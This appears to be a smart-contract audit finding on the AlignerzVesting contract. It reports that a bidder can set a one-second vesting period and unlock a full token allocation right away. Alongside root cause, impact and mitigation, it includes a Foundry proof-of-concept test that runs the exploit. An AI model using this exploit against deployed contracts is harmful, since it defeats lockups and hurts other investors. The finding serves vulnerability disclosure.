# [000199] [High]   Whale bidder will bypass vesting lockups for all other participants.
  
  ### Summary

 The `placeBid` check at `protocol/src/contracts/vesting/AlignerzVesting.sol:708-726` will cause an immediate unlock for honest vesters as an attacker will set `vestingPeriod = 1`, get that raw value copied into the NFT in `claimNFT` (`protocol/src/contracts/vesting/AlignerzVesting.sol:864-891`), and withdraw the full allocation in `claimTokens` after one second (`protocol/src/contracts/vesting/AlignerzVesting.sol:944-996`).

### Root Cause

 Root Cause
- In `protocol/src/contracts/vesting/AlignerzVesting.sol:708-726` the contract explicitly allows any `vestingPeriod < 2`, so a bidder-controlled one-second duration is accepted.
- In `protocol/src/contracts/vesting/AlignerzVesting.sol:864-891` the bid’s vestingPeriod is blindly embedded in the NFT allocation and never validated by Merkle data, so downstream logic must honor the attacker’s input.

### Internal Pre-conditions

 1. Admin needs to `launchBiddingProject` and `createPool` so that external users can call `placeBid` and receive NFTs.
2. Admin must call `finalizeBids` with merkle roots that do not contain vesting period data (current design) so the user-provided period remains unchecked.

### External Pre-conditions

none

### Attack Path

 1. Attacker calls `placeBid(projectId, amount, 1)` while auctions are open; the `< 2` shortcut bypasses the divisor requirement (`protocol/src/contracts/vesting/AlignerzVesting.sol:708-726`).
2. Admin finalizes the project; `claimNFT` copies `bid.vestingPeriod` (still `1`) into the allocation (`protocol/src/contracts/vesting/AlignerzVesting.sol:864-891`).
3. Attacker waits one second after `endTime` (now stored as vesting start) and calls `claimTokens`; `getClaimableAmountAndSeconds` treats `vestingPeriod = 1`, releasing 100% of the tokens (`protocol/src/contracts/vesting/AlignerzVesting.sol:944-996`).
4. Attacker dumps unlocked tokens while other participants are still vesting for months. PoC: `protocol/test/AlignerzVestingProtocolTest.t.sol:181-213`.

### Impact

The vesting schedule for bidding projects becomes meaningless: any malicious bidder can unlock and sell immediately, causing price impact and breaking investor expectations while compliant bidders remain locked.

The whole point of the bidding vesting schedule is to throttle supply so winners can’t dump immediately. If a bidder sets vestingPeriod = 1 (per protocol/src/contracts/vesting/AlignerzVesting.sol (lines 708-726)) the contract literally hands over their entire allocation one second after finalization ( (lines 944-996)). That means:


The “lockup” everyone priced into the sale no longer exists for the attacker—they can instantly sell into the market while others remain locked for months. That undermines any price stability assumptions the project or other bidders relied on.
or 
Whales can front‑run the pool and exit with full size liquidity. Honest bidders who expected a long vesting runway are left holding illiquid paper.





### PoC

```solidity

 function test_PoC_bidderBypassesLockupWithOneSecondVesting() public {
        address attacker = bidders[0];
        uint256 projectId = vesting.biddingProjectCount();
        uint256 bidAmount = 500 ether;
        uint256 start = block.timestamp;

        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(address(token), address(usdt), start, start + 10 days, bytes32(0), false);
        vesting.createPool(projectId, bidAmount, 1 ether, false);
        vm.stopPrank();

        vm.startPrank(attacker);
        usdt.approve(address(vesting), bidAmount);
        vesting.placeBid(projectId, bidAmount, 1);
        vm.stopPrank();

        bytes32 leaf = keccak256(abi.encodePacked(attacker, bidAmount, projectId, uint256(0)));
        bytes32[] memory roots = new bytes32[](1);
        roots[0] = leaf;
        uint256 finalizeTime = block.timestamp;
        vm.prank(projectCreator);
        vesting.finalizeBids(projectId, bytes32(0), roots, 30 days);

        bytes32[] memory proof = new bytes32[](0);
        vm.prank(attacker);
        uint256 nftId = vesting.claimNFT(projectId, 0, bidAmount, proof);

        vm.warp(finalizeTime + 1);
        vm.prank(attacker);
        vesting.claimTokens(projectId, nftId);

        assertEq(token.balanceOf(attacker), bidAmount, "entire allocation should unlock after one second");
    }
```

### Mitigation

Remove the `< 2` carve-out, enforce `vestingPeriod` to be at least `vestingPeriodDivisor`, and include the validated period inside the Merkle leaf so operators can reject proofs that don’t match policy.

  